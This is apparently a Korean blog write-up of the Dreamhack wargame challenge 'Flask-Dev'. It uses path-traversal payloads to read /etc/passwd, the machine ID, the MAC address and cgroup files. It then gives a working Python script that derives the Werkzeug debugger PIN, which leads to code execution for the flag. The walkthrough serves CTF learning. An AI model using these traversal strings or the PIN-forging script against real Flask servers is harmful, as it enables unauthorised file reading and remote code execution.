---
slug: "flask-dev"
title: "Flask-Dev"
date: 2026-07-20
category: "웹 해킹"
section: "wargame"
tags: []
excerpt: "소스코드에 다음과 같은게 있어서 확인해봄 Pasted image 20260720173242.png 살짝 Path travelsal 같은 느낌으로 ../../../ 이거 이용해서…"
readingTime: 6
---

# LFI 지점 발견

소스코드에 다음과 같은게 있어서 확인해봄
![](assets/images/posts/Pasted%20image%2020260720173242.png)
살짝 Path travelsal 같은 느낌으로 ../../../ 이거 이용해서 url 인코딩해서 읽으면 됨
`../../../../etc/passwd`
![](assets/images/posts/Pasted%20image%2020260720173341.png)

----
## PIN 내가 직접 구하는데 필요한 것

[참고 사이트](https://hg2lee.tistory.com/entry/Flask-Debugger-Console-Mode-Vulnerabilities)


**username :** docker에는 `dreamhack`
**modname :** 보통 `flask.app`
**app_name_:** `Flask`
Flask 모듈 파일 경로 : `/usr/local/lib/python3.8/site-packages/flask/app.py`

**mac 주소 :** 
`../../../../../../../../../../../../proc/net/arp`
![](assets/images/posts/Pasted%20image%2020260720163021.png)
../../../../../../../../../../../sys/class/net/eth0/address
![](assets/images/posts/Pasted%20image%2020260720165226.png)
**aa:fc:00:01:a4:01**

**Machine ID :** 
`../../../../../../../../../../etc/machine-id`

![](assets/images/posts/Pasted%20image%2020260720162614.png)
**c31eea55a29431535ff01de94bdcf5cf**
아 이 머신 아이디가 말이죠 최신 Werkzeug 에선
`../../../../../../proc/self/cgroup` 이 파일 맨뒤에 있는  읽고 

---

/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py
이 파일에 private_bit, probably_public_bit 이 두개가 있어야 Debugger PIN을 구할 수 있다고 함

![](assets/images/posts/Pasted%20image%2020260720163231.png)
![](assets/images/posts/Pasted%20image%2020260720163444.png)
일단 두개 다 존재 확인 했고 이제 debugger pin을 구해보자
```python
import hashlib

from itertools import chain

probably_public_bits = [
    'dreamhack',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py',
]

private_bits = [
    str(int("aa:fc:00:01:a4:01".replace(":", ""), 16)),
    "c31eea55a29431535ff01de94bdcf5cf" + "libpod-0d2da1f12e82b8f4753b40c3827d54f75841452e81a23ea72a68dd66311a3fb4"  # 대시 없이!
]

for algo in [hashlib.md5, hashlib.sha1]:
    h = algo()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    num = None
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv = None
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x+group_size].rjust(group_size,'0') for x in range(0, len(num), group_size))
            break
    print(algo.__name__, rv)
```
-> 얘가 md5로 암호화 되는 버전이 있고 sha1로 암호화 하는 버전이 있다고 함
> openssl_md5 255-368-380
> openssl_sha1 461-153-840

md5로 암호화 된 녀석이였음
-> 사실 `../../../../../../../../../../usr/local/lib/python3.8/site-packages/werkzeug/__init__.py`
여기서 버전 확인 가능 
![](assets/images/posts/Pasted%20image%2020260720173002.png)
1.0.1 이고 이 버전은 md5를 사용하는 버전임


---
# RCE

**참고** 
[핵트릭스](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)
이제 RCE를 실행해보면 플래그 획득 가능

![](assets/images/posts/Pasted%20image%2020260720172530.png)